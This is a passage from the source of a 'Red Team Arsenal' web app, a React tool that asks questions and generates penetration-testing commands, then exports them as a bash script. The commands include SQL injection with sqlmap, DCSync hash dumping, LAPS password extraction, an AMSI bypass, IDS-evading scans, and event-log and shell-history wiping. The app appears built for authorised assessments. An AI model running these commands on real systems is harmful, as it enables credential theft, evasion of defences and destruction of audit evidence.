          command: `whatweb ${webTarget}`,
          notes: 'Identifies web frameworks, content management systems, and server details'
        });
        
        commands.push({
          title: 'Directory Discovery',
          description: 'Find hidden directories and files',
          command: `gobuster dir -u ${webTarget} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`,
          notes: 'Discovers potentially accessible directories and files'
        });
        
        commands.push({
          title: 'Web Vulnerability Scan',
          description: 'Check for common web vulnerabilities',
          command: `nikto -h ${webTarget}`,
          notes: 'Identifies security issues, misconfigurations, and outdated software'
        });
        
        commands.push({
          title: 'SQL Injection Test',
          description: 'Test for SQL injection vulnerabilities',
          command: `sqlmap -u "${webTarget}" --forms --batch`,
          notes: 'Automatically detects and exploits SQL injection in web forms'
        });
      }
    }
    else if (attackType === 'Network Infrastructure') {
      // Add Network-specific commands
      if (targetIP) {
        commands.push({
          title: 'Network Sweep',
          description: 'Discover live hosts in the network',
          command: `nmap -sn ${targetIP}/24`,
          notes: 'Performs a ping scan to identify active hosts'
        });
        
        commands.push({
          title: 'Vulnerability Scan',
          description: 'Check for known vulnerabilities',
          command: `nmap --script vuln ${targetIP}`,
          notes: 'Scans for common vulnerabilities using Nmap scripts'
        });
      }
      
      if (hasCredentials && username && password) {
        commands.push({
          title: 'SSH Access',
          description: 'Attempt to access via SSH',
          command: `ssh ${username}@${targetIP}`,
          notes: 'Tries to establish an SSH connection with provided credentials'
        });
      }
    }
    else if (attackType === 'Cloud') {
      // Add Cloud-specific commands
      if (cloudType === 'AWS') {
        commands.push({
          title: 'Configure AWS CLI',
          description: 'Set up AWS credentials',
          command: 'aws configure',
          notes: 'You will be prompted to enter access key, secret key, region, and output format'
        });
        
        commands.push({
          title: 'List S3 Buckets',
          description: 'Enumerate all accessible S3 buckets',
          command: 'aws s3 ls',
          notes: 'Shows all S3 buckets the configured credentials can access'
        });
        
        commands.push({
          title: 'Check Identity',
          description: 'Verify current identity and permissions',
          command: 'aws sts get-caller-identity',
          notes: 'Shows account ID, user ID, and ARN of the current credentials'
        });
      } 
      else if (cloudType === 'Azure') {
        commands.push({
          title: 'Azure CLI Login',
          description: 'Authenticate to Azure',
          command: 'az login',
          notes: 'Starts interactive login process for Azure'
        });
        
        commands.push({
          title: 'List Subscriptions',
          description: 'Enumerate accessible subscriptions',
          command: 'az account list',
          notes: 'Shows all subscriptions the authenticated user can access'
        });
        
        commands.push({
          title: 'List Resource Groups',
          description: 'Enumerate resource groups',
          command: 'az group list',
          notes: 'Lists all resource groups in the current subscription'
        });
      }
      else if (cloudType === 'Google Cloud') {
        commands.push({
          title: 'GCloud Auth',
          description: 'Authenticate to Google Cloud',
          command: 'gcloud auth login',
          notes: 'Starts interactive login process for Google Cloud'
        });
        
        commands.push({
          title: 'List Projects',
          description: 'Enumerate accessible projects',
          command: 'gcloud projects list',
          notes: 'Shows all projects the authenticated user can access'
        });
      }
    }

    // Add advanced variants if in advanced mode
    if (advancedMode) {
      if (attackType === 'Active Directory') {
        // Add advanced AD commands
        if (targetIP && hasCredentials && username && password) {
          commands.push({
            title: 'DCSync Attack (Advanced)',
            description: 'Extract password hashes from the domain controller',
            command: `secretsdump.py ${domainName}/${username}:"${password}"@${targetIP} -just-dc-ntlm`,
            notes: includeOpsec ? 'OPSEC: This creates a lot of replication traffic and may be logged as directory service access' : undefined
          });
          
          commands.push({
            title: 'LAPS Password Extraction',
            description: 'Extract LAPS passwords if accessible',
            command: `Get-LAPSPasswords.py -u "${username}" -p "${password}" -d ${domainName} -l ${targetIP}`,
            notes: includeOpsec ? 'OPSEC: Queries for ms-Mcs-AdmPwd attribute which may be monitored' : undefined
          });
          
          if (includeEvasion) {
            commands.push({
              title: 'AMSI Bypass for PowerShell',
              description: 'Bypass AMSI to run blocked PowerShell scripts',
              command: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
              notes: 'This bypasses AMSI to allow running PowerShell scripts that might be blocked'
            });
          }
        }
      }
      
      if (attackType === 'Network Infrastructure' && targetIP) {
        commands.push({
          title: 'Responder (Advanced)',
          description: 'Capture NTLM hashes using Responder with advanced options',
          command: `responder -I eth0 -rwPv`,
          notes: includeOpsec ? 'OPSEC: Very noisy, creates multiple poisoned responses on the network' : undefined
        });
        
        if (includeEvasion) {
          commands.push({
            title: 'Firewall Evasion Scan',
            description: 'Scan using techniques to evade firewall detection',
            command: `nmap -sS -T2 --data-length 15 --max-retries 0 --randomize-hosts ${targetIP}`,
            notes: 'Uses slower timing, random packet length and host order to avoid triggering IDS/IPS'
          });
        }
      }
      
      // Add cleanup commands if requested
      if (includeCleanup) {
        commands.push({
          title: 'Clean Event Logs (Windows)',
          description: 'Clear Windows event logs to remove evidence',
          command: `wevtutil cl System && wevtutil cl Security && wevtutil cl Application`,
          notes: 'WARNING: Log clearing itself may be logged or monitored in secure environments'
        });
        
        commands.push({
          title: 'Remove Command History (Linux)',
          description: 'Clear bash history and disable logging',
          command: `history -c && rm ~/.bash_history && ln -sf /dev/null ~/.bash_history && export HISTSIZE=0`,
          notes: 'Clears current history, removes history file, and prevents new history from being written'
        });
      }
    }

    // Add MITRE ATT&CK references to commands if in advanced mode
    if (advancedMode) {
      // Example for Active Directory commands
      if (attackType === 'Active Directory') {
        // Update Kerberoasting command with MITRE reference
        const kerberoastIndex = commands.findIndex(cmd => cmd.title.includes('Kerberoasting'));
        if (kerberoastIndex !== -1) {
          commands[kerberoastIndex].mitreTechnique = 'Steal or Forge Kerberos Tickets';
          commands[kerberoastIndex].mitreId = 'T1558';
        }
        
        // Update BloodHound command with MITRE reference
        const bloodhoundIndex = commands.findIndex(cmd => cmd.title.includes('BloodHound'));
        if (bloodhoundIndex !== -1) {
          commands[bloodhoundIndex].mitreTechnique = 'Domain Trust Discovery';
          commands[bloodhoundIndex].mitreId = 'T1482';
        }
        
        // Add DCSync MITRE reference
        const dcsyncIndex = commands.findIndex(cmd => cmd.title.includes('DCSync'));
        if (dcsyncIndex !== -1) {
          commands[dcsyncIndex].mitreTechnique = 'DCSync';
          commands[dcsyncIndex].mitreId = 'T1003.006';
        }
      }
      
      // Example for Web Application commands
      if (attackType === 'Web Application') {
        const sqlmapIndex = commands.findIndex(cmd => cmd.title.includes('SQL Injection'));
        if (sqlmapIndex !== -1) {
          commands[sqlmapIndex].mitreTechnique = 'Exploit Public-Facing Application';
          commands[sqlmapIndex].mitreId = 'T1190';
        }
      }
    }

    setGeneratedCommands(commands);
    setCommandGenerationComplete(true);
  };

  // Handle question answer
  const handleAnswer = (questionId: string, value: string) => {
    setAnswers(prev => ({ ...prev, [questionId]: value }));
  };

  // Get next visible question
  const getNextVisibleQuestionIndex = (startIndex: number) => {
    for (let i = startIndex + 1; i < commandGeneratorQuestions.length; i++) {
      const question = commandGeneratorQuestions[i];
      if (!question.dependsOn) {
        return i;
      }
      
      const dependsOn = question.dependsOn;
      const dependencyValue = answers[dependsOn.questionId];
      
      if (dependsOn.values.includes(dependencyValue)) {
        return i;
      }
    }
    return -1; // No more questions
  };

  // Go to next question
  const goToNextQuestion = () => {
    const nextIndex = getNextVisibleQuestionIndex(currentQuestionIndex);
    
    if (nextIndex === -1) {
      // No more questions, generate commands
      generateCommands();
    } else {
      setCurrentQuestionIndex(nextIndex);
    }
  };

  // Reset command generator
  const resetCommandGenerator = () => {
    setCurrentQuestionIndex(0);
    setAnswers({});
    setGeneratedCommands([]);
    setCommandGenerationComplete(false);
  };

  // Check if current question should be shown
  const shouldShowQuestion = (question: CommandGeneratorQuestion) => {
    if (!question.dependsOn) {
      return true;
    }
    
    const dependsOn = question.dependsOn;
    const dependencyValue = answers[dependsOn.questionId];
    
    return dependsOn.values.includes(dependencyValue);
  };

  // Function to download generated commands as a bash script
  const downloadAsScript = () => {
    let scriptContent = "#!/bin/bash\n\n";
    scriptContent += "# Red Team Command Script\n";
    scriptContent += "# Generated on: " + new Date().toLocaleString() + "\n\n";
    
    generatedCommands.forEach((cmd, index) => {
      scriptContent += `echo "Step ${index + 1}: ${cmd.title}"\n`;
      scriptContent += `echo "${cmd.description}"\n`;
      scriptContent += `# ${cmd.notes}\n`;
      scriptContent += `${cmd.command}\n\n`;
      scriptContent += `echo "Press Enter to continue..."\n`;
      scriptContent += `read\n\n`;
    });
    
    const blob = new Blob([scriptContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'red_team_commands.sh';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  // Add function to download as professional formats
  const downloadAsProfessional = (format: 'json' | 'csv' | 'yaml' | 'markdown') => {
    let content = '';
    
    switch (format) {
      case 'json':
        content = JSON.stringify({
          createdAt: new Date().toISOString(),
          scenario: {
            attackType: answers['attackType'],
            target: answers['targetIP'] || answers['webTarget'],
            domain: answers['domainName'],
          },
          commands: generatedCommands.map(cmd => ({
            ...cmd,
            id: Math.random().toString(36).substring(2, 9)
          }))
        }, null, 2);
        break;
        
      case 'csv':
        content = 'Title,Description,Command,MITRE ID,MITRE Technique\n';
        generatedCommands.forEach(cmd => {
          content += `"${cmd.title}","${cmd.description}","${cmd.command}","${cmd.mitreId || ''}","${cmd.mitreTechnique || ''}"\n`;
        });
        break;
        
      case 'yaml':
        content = `---\ncreatedAt: ${new Date().toISOString()}\n`;
        content += `scenario:\n  attackType: ${answers['attackType']}\n`;
        content += `  target: ${answers['targetIP'] || answers['webTarget'] || ''}\n`;
        content += `  domain: ${answers['domainName'] || ''}\n`;
        content += 'commands:\n';
        generatedCommands.forEach(cmd => {
          content += `  - title: ${cmd.title}\n`;
          content += `    description: ${cmd.description}\n`;
          content += `    command: ${cmd.command}\n`;
          if (cmd.mitreTechnique) content += `    mitreTechnique: ${cmd.mitreTechnique}\n`;
          if (cmd.mitreId) content += `    mitreId: ${cmd.mitreId}\n`;
          if (cmd.notes) content += `    notes: ${cmd.notes}\n`;
          content += '\n';
        });
        break;
        
      case 'markdown':
        content = `# Red Team Commands - ${answers['attackType']}\n\n`;
        content += `Generated: ${new Date().toLocaleString()}\n\n`;
        content += `Target: ${answers['targetIP'] || answers['webTarget'] || 'Not specified'}\n`;
        if (answers['domainName']) content += `Domain: ${answers['domainName']}\n`;
        content += '\n## Commands\n\n';
        
        generatedCommands.forEach((cmd, i) => {
          content += `### ${i+1}. ${cmd.title}\n\n`;
          content += `${cmd.description}\n\n`;
          content += '```bash\n';
          content += `${cmd.command}\n`;
          content += '```\n\n';
          
          if (cmd.mitreId) {
            content += `**MITRE ATT&CK**: [${cmd.mitreTechnique} (${cmd.mitreId})](https://attack.mitre.org/techniques/${cmd.mitreId.replace('.', '/')})\n\n`;
          }
          
          if (cmd.notes) content += `**Notes**: ${cmd.notes}\n\n`;
          content += '---\n\n';
        });
        break;
    }
    
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `red_team_commands.${format}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  // Handle category selection with smooth scrolling and loading state
  const handleCategoryClick = (categoryName: string) => {
    if (selectedCategory === categoryName) {
      setSelectedCategory(null);
      setSelectedSubcategory(null);
      setIsLoadingCategory(false);
    } else {
      // Start loading state
      setIsLoadingCategory(true);
      setSelectedCategory(categoryName);
      setSelectedSubcategory(null);
      
      // Set helper info based on selected category
      const categoryKey = categoryName.toLowerCase().replace(/\s+/g, '');
      setActiveHelp(categoryKey);
      
      // Smooth scroll to results after a brief delay to show loading
      setTimeout(() => {
        setIsLoadingCategory(false);
        if (resultsRef.current) {
          resultsRef.current.scrollIntoView({ 
            behavior: 'smooth', 
            block: 'start',
            inline: 'nearest'
          });
        }
      }, 500);
    }
  };

  // Handle subcategory selection with smooth scrolling
  const handleSubcategoryClick = (subcategoryName: string) => {
    if (selectedSubcategory === subcategoryName) {
      setSelectedSubcategory(null);
    } else {
      setSelectedSubcategory(subcategoryName);
      
      // Smooth scroll to show the expanded commands
      setTimeout(() => {
        if (resultsRef.current) {
          const commandsSection = resultsRef.current.querySelector('.commands-section');
          if (commandsSection) {
            commandsSection.scrollIntoView({ 
              behavior: 'smooth', 
              block: 'start',
              inline: 'nearest'
            });
          }
        }
      }, 100);
    }
  };

  // Handle command expansion
  const toggleCommandExpanded = (commandId: string) => {
    setExpandedCommands(prev => ({
      ...prev,
      [commandId]: !prev[commandId]
    }));
  };

  // Copy command to clipboard
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCommand(text);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  // Toggle advanced feature selection
  const toggleAdvancedFeature = (featureId: string) => {
    setSelectedAdvancedFeatures(prev => {
      if (prev.includes(featureId)) {
        return prev.filter(id => id !== featureId);
      } else {
        return [...prev, featureId];
      }
    });
  };

  // Add custom command to list
  const addCustomCommand = () => {
    if (currentCustomCommand.title && currentCustomCommand.command) {
      setCustomCommands(prev => [...prev, {...currentCustomCommand}]);
      setCurrentCustomCommand({
        title: '',
        description: '',
        command: '',
        notes: ''
      });
    }
  };

  // Remove custom command from list
  const removeCustomCommand = (index: number) => {
    setCustomCommands(prev => prev.filter((_, i) => i !== index));
  };

  // Add custom commands to generated commands
  const addCustomCommandsToGenerated = () => {
    setGeneratedCommands(prev => [...prev, ...customCommands]);
    setShowCustomBuilder(false);
  };

  // Calculate comprehensive statistics
  const calculateStats = () => {
    let totalCommands = 0;
    let commandsWithExamples = 0;
    let commandsWithMitre = 0;
    let commandsWithOpsec = 0;
    let commandsWithEvasion = 0;
    let riskLevelCounts = { Low: 0, Medium: 0, High: 0, Critical: 0 };
    let platformCounts: Record<string, number> = {};

    cheatsheetData.forEach(category => {
      category.subcategories.forEach(subcategory => {
        subcategory.commands.forEach(command => {
          totalCommands++;
          if (command.example) commandsWithExamples++;
          if (command.mitreTechnique && command.mitreId) commandsWithMitre++;
          if (command.opsecNotes) commandsWithOpsec++;
          if (command.evasionTips) commandsWithEvasion++;
          if (command.riskLevel) riskLevelCounts[command.riskLevel]++;
          if (command.platform) {
            command.platform.forEach(platform => {
              platformCounts[platform] = (platformCounts[platform] || 0) + 1;
            });
          }
        });
      });
    });

    return {
      totalCommands,
      commandsWithExamples,
      commandsWithMitre,
      commandsWithOpsec,
      commandsWithEvasion,
      riskLevelCounts,
      platformCounts,
      examplePercentage: Math.round((commandsWithExamples / totalCommands) * 100),
      mitrePercentage: Math.round((commandsWithMitre / totalCommands) * 100),
      opsecPercentage: Math.round((commandsWithOpsec / totalCommands) * 100),
      evasionPercentage: Math.round((commandsWithEvasion / totalCommands) * 100)
    };
  };

  const stats = calculateStats();

  return (
    <div className="relative min-h-screen w-full flex flex-col items-center justify-center bg-black overflow-hidden text-white">
      {/* Clean Dark Background with Subtle Grid */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        {/* Subtle grid pattern */}
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.02)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.02)_1px,transparent_1px)] bg-[size:50px_50px]" />
        
        {/* Radial overlay for depth */}
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,transparent_40%,rgba(0,0,0,0.8)_100%)]" />
      </div>


      
      <div className="bg-gradient-to-b from-black to-zinc-900 w-full flex justify-center pb-8 relative z-10">
        <div className="relative z-10 max-w-6xl w-full px-6">
          <div className="text-center mb-16 relative pt-20 flex flex-col justify-center items-center">
            <motion.div
              initial={{ opacity: 0, scale: 0.5 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.7, type: "spring" }}
              className="relative mb-6" 
            >
              <LiquidGlass
                variant="prominent"
                intensity="high"
                rounded="full"
                className="w-20 h-20 flex items-center justify-center shadow-lg"
              >
                <Terminal className="w-8 h-8 text-red-400" />
              </LiquidGlass>
            </motion.div>
            
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6 }}
              className="text-center"
            >
              <h1 className="text-4xl md:text-6xl font-bold text-white mb-2">
                <span className="bg-gradient-to-r from-red-400 via-red-500 to-red-600 bg-clip-text text-transparent">
                  Red Team
                </span>{' '}
                <span className="text-white">Arsenal</span>
          </h1>
              <div className="flex items-center justify-center gap-2 mb-4">
                <div className="h-px bg-gradient-to-r from-transparent via-red-500 to-transparent w-20"></div>
                <Terminal className="w-5 h-5 text-red-400" />
                <div className="h-px bg-gradient-to-r from-transparent via-red-500 to-transparent w-20"></div>
              </div>
            </motion.div>
            
            <motion.p 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6, delay: 0.2 }}
              className="mt-4 text-lg md:text-xl text-zinc-300 max-w-3xl text-center"
            >
              The ultimate red team arsenal with comprehensive penetration testing commands, techniques, and methodologies. 
              <span className="text-red-400 font-semibold"> Over 700+ commands</span> across 
              <span className="text-blue-400 font-semibold"> 12 major categories</span> including 
              Infrastructure, OSINT, Wireless, Mobile, Evasion, Forensics, and more. Each command includes 
              <span className="text-green-400 font-semibold"> MITRE ATT&CK mappings</span>, 
              <span className="text-yellow-400 font-semibold"> OPSEC considerations</span>, and 
              <span className="text-purple-400 font-semibold"> evasion techniques</span>.
            </motion.p>
            
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6, delay: 0.4 }}
              className="mt-6 flex flex-wrap gap-2 justify-center"
            >
              <div className="px-3 py-1 bg-red-500/20 border border-red-500/30 rounded-full text-sm text-red-300">
                Infrastructure
              </div>
              <div className="px-3 py-1 bg-blue-500/20 border border-blue-500/30 rounded-full text-sm text-blue-300">
                Cloud Security
              </div>
              <div className="px-3 py-1 bg-green-500/20 border border-green-500/30 rounded-full text-sm text-green-300">
                Web Applications
              </div>
              <div className="px-3 py-1 bg-purple-500/20 border border-purple-500/30 rounded-full text-sm text-purple-300">
                Active Directory
              </div>
              <div className="px-3 py-1 bg-yellow-500/20 border border-yellow-500/30 rounded-full text-sm text-yellow-300">
                Wireless Security
              </div>
              <div className="px-3 py-1 bg-pink-500/20 border border-pink-500/30 rounded-full text-sm text-pink-300">
                Mobile Security
              </div>
              <div className="px-3 py-1 bg-cyan-500/20 border border-cyan-500/30 rounded-full text-sm text-cyan-300">
                OSINT & Recon
              </div>
              <div className="px-3 py-1 bg-orange-500/20 border border-orange-500/30 rounded-full text-sm text-orange-300">
                Evasion Techniques
              </div>
              <div className="px-3 py-1 bg-indigo-500/20 border border-indigo-500/30 rounded-full text-sm text-indigo-300">
                Forensics & DFIR
              </div>
              <div className="px-3 py-1 bg-teal-500/20 border border-teal-500/30 rounded-full text-sm text-teal-300">
                C2 Frameworks
              </div>
            </motion.div>

            {/* Comprehensive Statistics */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6, delay: 0.6 }}
              className="mt-8 max-w-4xl mx-auto"
            >
              <LiquidGlass
                variant="card"
                intensity="medium"
                rounded="xl"
                className="p-6 border-zinc-800/50"
              >
                <div className="text-center mb-4">
                  <h3 className="text-lg font-semibold text-zinc-200 mb-2">Arsenal Statistics</h3>
                  <p className="text-sm text-zinc-400">Comprehensive coverage with professional-grade metadata</p>
                </div>
                
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
                  <div className="text-center">
                    <div className="text-2xl font-bold text-red-400">{stats.totalCommands}</div>
                    <div className="text-xs text-zinc-400">Total Commands</div>
                  </div>
                  <div className="text-center">
                    <div className="text-2xl font-bold text-green-400">{stats.examplePercentage}%</div>
                    <div className="text-xs text-zinc-400">With Examples</div>
                  </div>
                  <div className="text-center">
                    <div className="text-2xl font-bold text-blue-400">{stats.mitrePercentage}%</div>
                    <div className="text-xs text-zinc-400">MITRE Mapped</div>
                  </div>
                  <div className="text-center">
                    <div className="text-2xl font-bold text-yellow-400">{stats.opsecPercentage}%</div>
                    <div className="text-xs text-zinc-400">OPSEC Notes</div>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  {/* Risk Level Distribution */}
                  <div>
                    <h4 className="text-sm font-medium text-zinc-300 mb-3 flex items-center gap-2">
                      <AlertTriangle className="w-4 h-4" />
                      Risk Level Distribution
                    </h4>
                    <div className="space-y-2">
                      {Object.entries(stats.riskLevelCounts).map(([level, count]) => (
                        <div key={level} className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <div className={`w-3 h-3 rounded-full ${
                              level === 'Critical' ? 'bg-red-500' :
                              level === 'High' ? 'bg-orange-500' :
                              level === 'Medium' ? 'bg-yellow-500' : 'bg-green-500'
                            }`}></div>
                            <span className="text-sm text-zinc-300">{level}</span>
                          </div>
                          <span className="text-sm text-zinc-400">{count}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Platform Support */}
                  <div>
                    <h4 className="text-sm font-medium text-zinc-300 mb-3 flex items-center gap-2">
                      <Cpu className="w-4 h-4" />
                      Platform Support
                    </h4>
                    <div className="space-y-2">
                      {Object.entries(stats.platformCounts)
                        .sort(([,a], [,b]) => b - a)
                        .slice(0, 4)
                        .map(([platform, count]) => (
                        <div key={platform} className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <span className="text-sm text-zinc-300">
                              {platform === 'Linux' ? '🐧' : 
                               platform === 'Windows' ? '🪟' : 
                               platform === 'macOS' ? '🍎' : '💻'} {platform}
                            </span>
                          </div>
                          <span className="text-sm text-zinc-400">{count}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Feature Indicators */}
                <div className="mt-6 pt-4 border-t border-zinc-800">
                  <div className="flex flex-wrap gap-3 justify-center text-xs">
                    <div className="flex items-center gap-1 text-green-400">
                      <div className="w-2 h-2 rounded-full bg-green-400"></div>
                      <span>{stats.commandsWithExamples} Examples</span>
                    </div>
                    <div className="flex items-center gap-1 text-red-400">
                      <div className="w-2 h-2 rounded-full bg-red-400"></div>
                      <span>{stats.commandsWithMitre} MITRE ATT&CK</span>
                    </div>
                    <div className="flex items-center gap-1 text-yellow-400">
                      <div className="w-2 h-2 rounded-full bg-yellow-400"></div>
                      <span>{stats.commandsWithOpsec} OPSEC</span>
                    </div>
                    <div className="flex items-center gap-1 text-cyan-400">
                      <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
                      <span>{stats.commandsWithEvasion} Evasion</span>
                    </div>
                  </div>
                </div>
              </LiquidGlass>
            </motion.div>
          
            <div className="flex flex-wrap gap-3 justify-center mt-6">
            {/* Helper toggle button */}
              <motion.button 
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
              onClick={() => setShowHelperInfo(!showHelperInfo)}
                className="px-4 py-2 bg-white/10 hover:bg-white/15 rounded-lg text-sm flex items-center gap-2 backdrop-blur-sm border border-white/10 transition-colors"
            >
              {showHelperInfo ? (
                <>
                  <ExternalLink size={14} />
                  Hide guidance
                </>
              ) : (
                <>
                  <ExternalLink size={14} />
                  Show guidance
                </>
              )}
              </motion.button>
            
            {/* Command Generator toggle button */}
              <motion.button 
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
              onClick={() => {
                setShowCommandGenerator(!showCommandGenerator);
                if (!showCommandGenerator) {
                  resetCommandGenerator();
                }
              }}
                className="px-4 py-2 bg-red-600/20 hover:bg-red-600/30 border border-red-500/30 rounded-lg text-sm flex items-center gap-2 backdrop-blur-sm transition-colors"
            >
              <Terminal size={14} />
              {showCommandGenerator ? 'Close' : 'Command Generator'}
              </motion.button>
          </div>
          </div>
        </div>
      </div>
        
      <div className="relative z-10 max-w-6xl w-full px-6 pb-20">
        {/* Command Generator */}
        {showCommandGenerator && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className="mb-8 max-w-4xl mx-auto"
          >
            <LiquidGlass
              variant="card"
              intensity="medium"
              rounded="xl"
              className="p-6 border-red-500/20"
          >
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-3">
                <div className="p-2 rounded-full bg-blue-500/20 text-blue-400">
                  <Terminal className="w-5 h-5" />
                </div>
                <h2 className="text-xl font-bold">Red Team Command Generator</h2>
              </div>
              
              {/* Advanced Mode Toggle */}
              <div className="flex items-center gap-2">
                <span className="text-sm text-zinc-400">Advanced Mode</span>
                <button 
                  onClick={() => setAdvancedMode(!advancedMode)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${
                    advancedMode ? 'bg-blue-600' : 'bg-zinc-700'
                  }`}
                >
                  <span
                    className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
                      advancedMode ? 'translate-x-6' : 'translate-x-1'
                    }`}
                  />
                </button>
              </div>
            </div>
            
            <p className="mb-6 text-zinc-400">
              Answer a few simple questions to generate customized commands for your specific assessment scenario.
            </p>
            
            {/* Advanced Features Selection */}
            {advancedMode && !commandGenerationComplete && (
              <div className="mb-6 p-3 bg-zinc-950/70 border border-zinc-800 rounded-lg">
                <h3 className="text-blue-400 text-sm font-medium mb-2">Advanced Options</h3>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                  {advancedFeatures.map(feature => (
                    <div 
                      key={feature.id}
                      onClick={() => toggleAdvancedFeature(feature.id)}
                      className={`p-2 rounded border cursor-pointer flex items-start gap-2 ${
                        selectedAdvancedFeatures.includes(feature.id)
                          ? 'bg-blue-900/30 border-blue-700/50'
                          : 'bg-zinc-900 border-zinc-800 hover:bg-zinc-800'
                      }`}
                    >
                      <div className={`mt-0.5 h-4 w-4 rounded flex-shrink-0 flex items-center justify-center ${
                        selectedAdvancedFeatures.includes(feature.id)
                          ? 'bg-blue-500'
                          : 'bg-zinc-700'
                      }`}>
                        {selectedAdvancedFeatures.includes(feature.id) && 
                          <Check className="h-3 w-3 text-white" />
                        }
                      </div>
                      <div>
                        <div className="text-sm font-medium">{feature.name}</div>
                        <div className="text-xs text-zinc-500">{feature.description}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
            
            {!commandGenerationComplete ? (
              <div>
                {commandGeneratorQuestions.map((question, index) => {
                  if (index === currentQuestionIndex && shouldShowQuestion(question)) {
                    return (
                      <motion.div 
                        key={question.id}
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        className="mb-6"
                      >
                        <label className="block mb-2 text-lg font-medium">{question.question}</label>
                        
                        {question.type === 'select' && question.options && (
                          <select
                            value={answers[question.id] || ''}
                            onChange={(e) => handleAnswer(question.id, e.target.value)}
                            className="w-full p-3 bg-zinc-800 border border-zinc-700 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                          >
                            <option value="">Select an option</option>
                            {question.options.map(option => (
                              <option key={option} value={option}>{option}</option>
                            ))}
                          </select>
                        )}
                        
                        {question.type === 'text' && (
                          <input
                            type="text"
                            value={answers[question.id] || ''}
                            onChange={(e) => handleAnswer(question.id, e.target.value)}
                            placeholder={question.placeholder || ''}
                            className="w-full p-3 bg-zinc-800 border border-zinc-700 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                          />
                        )}
                        
                        {question.type === 'checkbox' && (
                          <div className="flex items-center gap-3">
                            <button
                              onClick={() => handleAnswer(question.id, 'true')}
                              className={`px-4 py-2 rounded-md flex items-center gap-2 ${
                                answers[question.id] === 'true' 
                                  ? 'bg-green-600 text-white' 
                                  : 'bg-zinc-800 text-zinc-300'
                              }`}
                            >
                              {answers[question.id] === 'true' && <Check size={16} />}
                              Yes
                            </button>
                            <button
                              onClick={() => handleAnswer(question.id, 'false')}
                              className={`px-4 py-2 rounded-md flex items-center gap-2 ${
                                answers[question.id] === 'false' 
                                  ? 'bg-red-600 text-white' 
                                  : 'bg-zinc-800 text-zinc-300'
                              }`}
                            >
                              {answers[question.id] === 'false' && <Check size={16} />}
                              No
                            </button>
                          </div>
                        )}
                      </motion.div>
                    );
                  }
                  return null;
                })}
                
                <div className="flex justify-between mt-6">
                  <button
                    onClick={() => {
                      if (currentQuestionIndex > 0) {
                        setCurrentQuestionIndex(currentQuestionIndex - 1);
                      }
                    }}
                    className={`px-4 py-2 rounded-md ${
                      currentQuestionIndex === 0 
                        ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed' 
                        : 'bg-zinc-800 hover:bg-zinc-700 text-zinc-300'
                    }`}
                    disabled={currentQuestionIndex === 0}
                  >
                    Back
                  </button>
                  
                  <button
                    onClick={goToNextQuestion}
                    className={`px-4 py-2 rounded-md flex items-center gap-2 ${
                      !answers[commandGeneratorQuestions[currentQuestionIndex].id]
                        ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed'
                        : 'bg-blue-600 hover:bg-blue-700 text-white'
                    }`}
                    disabled={!answers[commandGeneratorQuestions[currentQuestionIndex].id]}
                  >
                    Next
                    <ArrowRight size={16} />
                  </button>
                </div>
              </div>
            ) : (
              <div>
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold text-blue-400">Generated Commands</h3>
                  <div className="flex gap-2">
                    <div className="relative group">
                      <button
                        className="px-3 py-1 bg-green-700/30 hover:bg-green-700/50 border border-green-600/30 rounded-md text-sm flex items-center gap-2"
                      >
                        <Download size={14} />
                        Export
                      </button>
                      <div className="absolute right-0 mt-2 w-48 rounded-md shadow-lg bg-zinc-800 ring-1 ring-black ring-opacity-5 hidden group-hover:block z-10">
                        <div className="py-1">
                          <button
                            onClick={() => downloadAsScript()}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            Bash Script (.sh)
                          </button>
                          <button
